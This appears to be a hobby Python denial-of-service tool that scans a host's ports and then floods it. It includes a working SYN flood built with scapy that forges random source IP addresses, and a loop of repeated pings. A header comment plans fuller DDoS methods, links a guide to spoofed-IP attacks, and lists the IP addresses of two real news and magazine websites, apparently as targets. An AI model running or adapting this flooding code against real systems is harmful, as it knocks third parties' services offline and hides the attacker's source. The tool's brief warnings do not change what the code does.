"""
Scanner and Flooding Module


 TODO:
 	1: create methods that actually flood ports we've scanned and found open
 	 1.a: Make sure that they cover the full range of flooding / DDOS we talked about
 	 1.b: see if there are "dummy" ip addresses out there that you can target and test flooding on
 	3: see if ICMP_Ping_flood() can be made to be distributed somehow.

Dist'd DOS?
https://www.blackmoreops.com/2015/04/21/denial-of-service-attack-dos-using-hping3-with-spoofed-ip-in-kali-linux/


		     151.101.117.164  www.nytimes.com
			 104.16.60.202    www.thrashermagazine.com

gathered from whois lookups @ https://www.ultratools.com/tools/ipWhoisLookup
"""

import sys
import socket
from scapy.all import *
import random
from multiprocessing import Pool
from platform   import system as system_name  # Returns the system/OS name
from subprocess import call   as system_call  # Execute a shell command

class State():
	"""
	Saves state of scanning and etc.
	"""
	def __init__(self):
		self.host_and_ports = {}  # key = host, val = list of open ports
	def report(self):
		""" Report on all hosts scanned and open ports found from them"""
		print()
		print("**************************************************")
		if not self.host_and_ports:
			print("No hosts have been scanned or loaded yet")
			return
		print("Here are all open ports found for all hosts scanned: ")
		for h in self.host_and_ports.keys():
			print("HOST: %s" % h)
			if not self.host_and_ports[h]:
				print("No open ports found for this host yet")
			for p in self.host_and_ports[h]:
				print("Open: %d" % p)
		print("**************************************************")
		print()

	def save(self):
		"""
		Will save hosts and open ports to a .txt file
		:return:
		"""
		path = input ("To save ports scanned to file, please enter a filename, with or without path.")
		f = None
		if not path.endswith('.txt'):
			path+='.txt'
		try:
			f=open(path, 'w')
		except Exception as e:
			print('file save failed, error from path')
			print (e)
			return
		try:
			for host in self.host_and_ports.keys():
				f.write(host + '\n')
				for port in self.host_and_ports[host]:
					f.write(str(port) +'\n')
				f.write("\n")
		except Exception as e:
			print(e)

	def load(self):
		"""
		Will open saved hosts and open ports using specified path
		:return:
		"""
		path = input("Please enter the file name, with full path if needed, to load hosts and open ports -> ")
		try:
			f = open(path)
			lines = f.read()
			entries = lines.split('\n\n')
			for entry in entries:
				host_ports = entry.split('\n')
				if host_ports[0] not in self.host_and_ports.keys():
					self.host_and_ports[host_ports[0]] = []
				host = host_ports[0]
				# if blank line read in as a host for some reason, skip it
				if host == "": continue
				# remove host from host ports as we've now accounted for it
				ports=host_ports[1:]
				# add all ports for this host to list, pointed to by host, host acting as a key
				for p in ports:
					if str(p) not in self.host_and_ports[host]:
						self.host_and_ports[host].append(int(p))
			print(self.host_and_ports)
		except e:
			print(e)


def ICMP_Ping_Flood(host, cmds):
	"""
	Sends a flood of pings n pings set by amount using the ICMP protocols.
	Remember that a host may not respond to a ping (ICMP) request even if the host name is valid.
	"""
	# defaults amount to 1 if user didn't specify an amount of pings
	try:
		amount = int(cmds[2])
	except IndexError:
		amount = 1
	except Exception as e:
		print('in ping flood: ')
		print('something was wrong with arguments: ', cmds)
		print ('\n',e)
		return
	try:
		amount=int(amount)
		# Ping command count option as function of OS
		param = '-n' if system_name().lower() == 'windows' else '-c'
		for i in range(0, amount):
			# Building the command. Ex: "ping -c 1 google.com"
			# <cmd> <os> <num packets> <hosts>
			command = ['ping', param, '1', host]
			# Pinging
			print(system_call(command))
	except Exception as e:
		print('something went wrong in ping flood ', e)
		print('host and number of pings set: ', cmds)

def randomIP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip

def randInt():
	x = random.randint(0, 255)
	return x

def SynAckAttack(host, cmds):
	"""
	sends syn packets to the host_and_ports list
	:return:
	"""
	print("\n###########################################")
	print("# Starting SYN ACK Attack..")
	print("###########################################\n")
	# ports=[]
	try:
		amount = int(cmds[3])
	except IndexError:
		amount = 1
	try:
		ports = cmds[2]
		ports = [int(p) for p in ports.split('.')]
	except IndexError:
		ports = []
	except Exception as e:
		print('in ping flood: ')
		print('something was wrong with arguments: ', cmds)
		print('\n', e)
		return
	# hosts = state.host_and_ports.keys()
	# ports = []
	if not ports:
		print("***\n[e]: No ports were specifed, please enter them like so: 80,81,88,3000")
		print("[cmds]: ", cmds)
		print()
		return
	# for host in hosts:
	print(f"# Attacking Target: {host}")
	for hostPort in ports:
		for x in range(0, amount):
			# Build a random packet
			s_port = randInt()
			s_eq = randInt()
			w_indow = randInt()

			IP_Packet = IP()
			IP_Packet.src = randomIP()
			IP_Packet.dst = host

			TCP_Packet = TCP()
			TCP_Packet.sport = s_port
			TCP_Packet.dport = hostPort
			TCP_Packet.flags = "S"
			TCP_Packet.seq = s_eq
			TCP_Packet.window = w_indow

			# Send the packet
			send(IP_Packet/TCP_Packet)

def scanning(args, state):
	"""
	scans host specified by user
	saves the open ports discovered in State object
	"""
	host = args[1]
	start_port = int(args[2])
	end_port   = int(args[3])
	assert start_port < end_port
	port_range=range(start_port, end_port+1)

	# reset comp_name in dict, so that it points to an empty list
	# will point to a list of open ports for the host (host), if any exist
	state.host_and_ports[host] = []

	# setup five procs for scanning
	pool = Pool(processes=5)
	# call do_scan() for each port, along with comp_name and state sent along each time
	for port, status in pool.imap_unordered(do_scan, [(host, port, state) for port in port_range]):
		print(port, 'is', 'open' if status else 'closed')
		if status:
			state.host_and_ports[host].append(port)

def do_scan(host_port_state):
	target_ip, port, _state = host_port_state

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.settimeout(2)

	try:
		sock.connect((target_ip, port))
		sock.close()

		return port, True
	except (socket.timeout, socket.error):
		return port, False

def list_ports(state):
	""" Wrapper, has our State obj call report() and list hosts we've scanned"""
	state.report()

def usage(print_code_name=True):
	"""
	Describe to user what this program does

	two modes: first run
	"""
	print("*********************************************************************")
	print("*                      Scanner and Flooder Tool                     *")
	print("*********************************************************************")
	print()
	print("ex, scan usage: scanner.py -s <target_host> <start_port> <end_port>")
	print("-h, -help	- print out the description of usage")
	print("-s	        - scan a target host and a range of ports\n"
			"            Requires three args, <host> and <port start> and <port end>")
	print("-l           - list the sets of ports found open for all hosts scanned")
	print("-pf          - flood a target host with an ICMP PING flood.\n" 
			"            Requires three args, <host> and <port start> and <port end>")
	print("-syn         - flood a target host with an SYN ACK flood.\n"
		  "              Requires two arguments: <host>, <ports> in format of 'p1,p2,p3,...,pn'. Has optional third argument, <amount> ")
	print("-a           - save hosts and open ports to a .txt file")
	print("-r           - read in hosts and open ports from a .txt file")
	print()
	print()
	print("Examples: ")

	print("-l")
	print("-s 192.168.0.1 0 500")
	print("-pf  192.168.0.1   (optional) <num of pings>")
	print("-syn 192.168.0.1   (optional) <num of pings>")

	# sys.exit(0)


if __name__ == "__main__":
	"""
		takes in args for operations
		and also iters thru a loop waiting for operations through raw input
		saves the program state with State (ports found open, etc)
	"""
	state = State()
	usage()
	while True:
		try:
			print("Enter a set of commands(hint, type -h or -help for help)""")
			print("To quit, enter -q/-Q")
			print()
			cmds = input("<#SCNR> ").split()
			if 'scanner.py' in cmds:
				cmds.remove('scanner.py')
			if not cmds: continue
			if cmds[0] in ('-h', '-help'):
				usage(False)
			elif cmds[0] == "-s":
				scanning(cmds, state)
			elif cmds[0] == "-l":
				list_ports(state)
			elif cmds[0] == "-pf":
				# call for a ping flood
				print("WARNING: make sure you're not actually flooding a 'real' IP address")
				ICMP_Ping_Flood(cmds[1], cmds)
			elif cmds[0] == '-syn':
				print("WARNING: make sure you're not actually flooding a 'real' IP address")
				SynAckAttack(cmds[1], cmds)
			elif cmds[0] in ('-q', '-Q'):
				sys.exit(0)
			elif cmds[0] == '-a':
				state.save()
			elif cmds[0] == "-r":
				state.load()
			else:
				print("invalid arguments entered: %s" % cmds)
		except Exception as e:
			print('\n\n')
			print("***Something went wrong***")
			print("[cmds]: ", cmds)
			print("[e]: ", e)
			print("***                    ***")
			print()